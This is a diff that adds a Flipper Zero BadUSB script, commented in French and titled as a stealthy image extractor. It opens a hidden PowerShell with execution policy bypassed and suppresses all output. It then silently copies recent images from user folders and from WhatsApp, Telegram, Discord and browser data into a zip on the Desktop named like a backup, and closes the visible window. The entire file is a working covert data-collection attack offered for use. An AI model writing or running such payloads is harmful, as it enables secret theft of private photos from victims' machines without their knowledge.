@@ -1,0 +1,36 @@
+REM ================================================================
+REM Flipper Zero BadUSB - Extracteur d'Images Furtif
+REM ================================================================
+REM Nom: Extraction Furtive (Stealth Extract)
+REM Description: Extraction silencieuse en arrière-plan sans interface visible
+REM Cible: Windows 7/8/10/11 (PowerShell 2.0+)
+REM Auteur: Plume-Paopedia
+REM Version: 1.0
+REM Durée: Variable (processus en arrière-plan)
+REM Privilèges: Utilisateur standard (pas d'admin requis)
+REM Caractéristiques: Fenêtre masquée, aucun feedback visuel
+REM ================================================================
+
+REM Délai minimal pour opération furtive
+DEFAULT_DELAY 200
+
+REM Ouverture discrète de PowerShell avec fenêtre masquée
+GUI r
+DELAY 400
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1500
+
+REM Script PowerShell furtif complet exécuté en une seule commande
+STRING Start-Process powershell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy','Bypass','-Command','&{try{$ErrorActionPreference="SilentlyContinue";$WarningPreference="SilentlyContinue";$VerbosePreference="SilentlyContinue";$ProgressPreference="SilentlyContinue";$DebugPreference="SilentlyContinue";$InformationPreference="SilentlyContinue";$basePath="$env:USERPROFILE\Desktop\.temp_images_$(Get-Date -Format "yyyyMMddHHmmss")";New-Item -ItemType Directory -Path $basePath -Force|Out-Null;$extensions=@("*.jpg","*.jpeg","*.png","*.gif","*.bmp","*.webp","*.ico","*.tiff","*.tif","*.jfif","*.heic","*.raw");$locations=@("$env:USERPROFILE\Pictures","$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\Videos","$env:LOCALAPPDATA\Packages","$env:APPDATA\WhatsApp","$env:APPDATA\Telegram Desktop","$env:APPDATA\discord","$env:LOCALAPPDATA\Google\Chrome\User Data","$env:LOCALAPPDATA\Mozilla\Firefox","$env:TEMP");$count=0;$dateLimit=(Get-Date).AddDays(-60);foreach($loc in $locations){if(Test-Path $loc){foreach($ext in $extensions){$files=Get-ChildItem -Path $loc -Filter $ext -Recurse -Force -ErrorAction SilentlyContinue|Where-Object{$_.LastWriteTime -gt $dateLimit -and $_.Length -lt 50MB -and -not $_.PSIsContainer};foreach($file in $files){try{$newName="img_$(Get-Date -Format "HHmmss")_$count" + $file.Extension;Copy-Item $file.FullName -Destination "$basePath\$newName" -ErrorAction SilentlyContinue;$count++}catch{}}}}};$logData="Extraction furtive terminee`nDate: $(Get-Date)`nImages copiees: $count`nDossier: $basePath";$logData|Out-File -FilePath "$basePath\_stealth_log.txt" -Encoding UTF8;if($count -gt 0){$zipPath="$env:USERPROFILE\Desktop\backup_$(Get-Date -Format "yyyyMMdd_HHmmss").zip";Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::CreateFromDirectory($basePath,$zipPath);Remove-Item $basePath -Recurse -Force -ErrorAction SilentlyContinue}}catch{$errorLog="Erreur stealth: $($_.Exception.Message)`nDate: $(Get-Date)";$errorLog|Out-File -FilePath "$env:TEMP\_stealth_error.log" -Encoding UTF8}}'
+ENTER
+DELAY 500
+
+REM Fermeture immédiate de la fenêtre PowerShell visible
+STRING exit
+ENTER
+
+REM Le processus continue maintenant en arrière-plan de manière totalement invisible
+REM L'extraction se fait sans aucune notification ou fenêtre visible
+REM Les fichiers seront archivés automatiquement sur le Bureau
+REM Un fichier de log sera créé en cas d'erreur dans %TEMP%
